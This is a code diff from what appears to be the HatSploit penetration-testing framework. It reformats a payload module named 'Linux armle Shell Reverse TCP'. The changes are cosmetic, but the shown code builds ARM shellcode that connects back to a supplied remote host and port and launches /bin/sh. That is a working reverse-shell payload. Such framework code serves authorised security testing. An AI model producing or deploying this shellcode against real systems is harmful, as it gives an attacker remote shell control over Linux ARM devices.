@@ -13,14 +13,12 @@ class HatSploitPayload(Payload, Socket):
     details = {
         'Name': "Linux armle Shell Reverse TCP",
         'Payload': "linux/armle/shell_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer'
-        ],
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
         'Description': "Shell reverse TCP payload for Linux armle.",
         'Architecture': "armle",
         'Platform': "linux",
         'Rank': "high",
-        'Type': "reverse_tcp"
+        'Type': "reverse_tcp",
     }
 
     def run(self):
@@ -42,7 +40,6 @@ class HatSploitPayload(Payload, Socket):
             b"\x92\x1a\x05\xb4"
             b"\x69\x46\x0b\x27"
             b"\x01\xDF\xC0\x46"
-            b"\x02\x00" + remote_port + remote_host +
-            b"\x2f\x62\x69\x6e"
+            b"\x02\x00" + remote_port + remote_host + b"\x2f\x62\x69\x6e"
             b"\x2f\x73\x68\x00"
         )
